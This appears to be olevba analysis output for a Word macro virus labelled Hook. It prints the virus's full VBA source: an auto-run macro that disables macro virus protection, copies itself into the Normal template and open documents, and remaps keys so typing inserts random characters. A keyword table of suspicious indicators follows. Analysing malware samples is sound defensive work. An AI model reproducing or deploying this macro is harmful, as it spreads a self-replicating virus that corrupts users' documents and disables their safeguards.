olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hook-411650634978dce7933f0c6af02cc4669c6d87d5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hook-411650634978dce7933f0c6af02cc4669c6d87d5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
Options.VirusProtection = False
Application.CommandBars("Tools").Controls(12).Visible = False

Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set TD = ThisDocument.VBProject.VBComponents(1).CodeModule
VCode = TD.Lines(1, TD.CountOfLines)
NT.DeleteLines 1, NT.CountOfLines: NT.InsertLines 1, VCode
AD.DeleteLines 1, AD.CountOfLines: AD.InsertLines 1, VCode

Randomize Selection.StoryLength
If (Int(Rnd * Selection.StoryLength)) < Selection.StoryLength Then
    For i = 1 To 25
        Application.KeyBindings.Add 2, "ThisDocument.Key_Hook", 64 + i
    Next
End If
End Sub
Private Sub Document_Close()
Application.KeyBindings.ClearAll
End Sub
Private Sub Key_Hook()
System.Cursor = wdCursorIBeam
Selection.TypeText Chr(Int(Rnd * 255))
System.Cursor = wdCursorIBeam
'// Have a nice day //
'// written by  Lord Arz [TI] //
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

